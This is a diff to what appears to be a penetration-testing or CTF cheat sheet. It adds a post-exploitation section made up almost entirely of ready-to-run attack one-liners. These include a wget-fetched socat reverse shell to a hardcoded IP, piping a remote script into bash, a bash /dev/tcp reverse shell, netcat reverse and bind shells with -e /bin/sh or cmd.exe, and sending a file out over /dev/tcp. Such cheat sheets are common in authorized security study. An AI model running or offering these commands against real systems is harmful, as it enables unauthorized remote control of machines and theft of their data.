@@ -152,6 +152,65 @@ THIS ALLOWS YOU TO GO DIRECTLY TO THE IMPORTANT ONES
 
 EyeWitness --> https://github.com/FortyNorthSecurity/EyeWitness
 
+# POST EXPLOTATION
+## SHELL
+### SHELL UPGRADE
+```
+python -c 'import pty;pty.spawn("/bin/bash")' 
+```
+### IF YOU HACE RCE (WITH SOCAT)
+```
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 
+```
+KALI:
+```
+socat file:`tty`, raw,echo=0 tcp-listen:4444
+```
+### OPEN .SH IN A URL
+```
+curl <IP:PORT>/FILE.sh | bash
+```
+### OPEN REVERSE SHELL USING /etc/tcp
+TARGET
+```
+bash -c 'bash -i >& /dev/tcp/IP/9001 0>&1
+```
+KALI
+```
+nc -lvnp 9001
+```
+### NETCAT
+- REVERSE SHELL
+KALI
+```
+nc -lvnp <PORT>
+```
+TARGET
+```
+nc -nv <IP> <PORT> -e /bin/sh
+nc -nv <IP> <PORT> -e cmd.exe
+```
+- SHELL
+```
+nc -nv <IP> <PORT>
+```
+TARGET
+```
+nc -lnvp <PORT> -e /bin/sh
+nc -lnvp <PORT> -e cmd.exe
+```
+
+- SEND FILES
+KALI
+```
+nc -lvnp 9001 > fichero.pdf
+```
+TARGET
+```
+cat fichero.pdf > /dev/tcp/<IP>/9001
+```
+
+
 # ESTEGO/CRYPTO
 Información general --> https://en.wikipedia.org/wiki/Steganography_tools
 
